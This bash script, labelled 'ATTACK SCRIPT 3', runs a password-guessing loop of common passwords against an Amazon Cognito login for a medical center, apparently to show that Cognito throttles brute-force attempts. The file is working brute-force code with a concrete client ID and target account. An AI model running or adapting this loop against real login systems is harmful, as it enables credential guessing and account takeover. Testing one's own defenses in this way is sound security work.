#!/usr/bin/env bash
# ============================================================
# ATTACK SCRIPT 3: Brute-force login attempts against Amazon Cognito
# Target: Al-Kausar Medical Center login (Cognito User Pool)
# Defense shown: AMAZON COGNITO NATIVE ACCOUNT-TAKE-OVER PROTECTION
#   - Wrong passwords are rejected (NotAuthorizedException)
#   - After several rapid failures Cognito throttles / forces
#     additional challenge, blocking the attack
# Note: Cognito does NOT publish a CloudWatch 'SignInFailures'
#   metric (even with Advanced Security), so we observe the
#   block directly in the API responses rather than via an alarm.
# ============================================================
set -u
CLIENT_ID="m0s0e255m43a8gpf62k69rhjb"
REGION="ap-south-1"
TARGET_USER="${1:-demo.patient@alkausar.com}"
ATTEMPTS="${2:-12}"

echo "============================================================"
echo "ATTACK 3: Brute-force password guessing against Cognito"
echo "Target user: $TARGET_USER | Attempts: $ATTEMPTS"
echo "Expect: failures (NotAuthorized), then Cognito throttling"
echo "============================================================"

PASSWORDS=(
  "123456" "password" "admin123" "letmein" "qwerty123"
  "Password1" "welcome1" "11111111" "demo1234" "12345678"
  "abc12345" "Password"
)
export PATH="$PATH:/home/hashir3000/awscli"
throttled=0
for ((i=0; i<ATTEMPTS; i++)); do
  pw="${PASSWORDS[$((i % ${#PASSWORDS[@]}))]}"
  result=$(aws cognito-idp initiate-auth \
    --client-id "$CLIENT_ID" \
    --auth-flow USER_PASSWORD_AUTH \
    --auth-parameters "USERNAME=${TARGET_USER},PASSWORD=${pw}" \
    --region "$REGION" 2>&1)
  if echo "$result" | grep -qi "TooManyFailedAttempts"; then
    printf "  attempt %d: ** BLOCKED by Cognito (TooManyFailedAttempts) **\n" "$((i+1))"
    throttled=$((throttled+1))
  elif echo "$result" | grep -qi "NotAuthorizedException"; then
    printf "  attempt %d: wrong password -> NotAuthorized\n" "$((i+1))"
  elif echo "$result" | grep -qi "PasswordResetRequired\|UserLambdaValidation"; then
    printf "  attempt %d: %s\n" "$((i+1))" "$(echo "$result" | grep -ioE "PasswordResetRequired|UserLambdaValidation")"
  elif echo "$result" | grep -qi "AuthenticationResult"; then
    printf "  attempt %d: SUCCESS (unexpected!)\n" "$((i+1))"
  else
    printf "  attempt %d: %s\n" "$((i+1))" "$(echo "$result" | tail -1)"
  fi
  sleep 1
done

echo ""
if [ "$throttled" -gt 0 ]; then
  echo "RESULT: Cognito throttled/blocked $throttled rapid attempts => brute-force defeated."
else
  echo "RESULT: Every wrong password was rejected; add more rapid attempts to trigger throttle."
fi
echo ""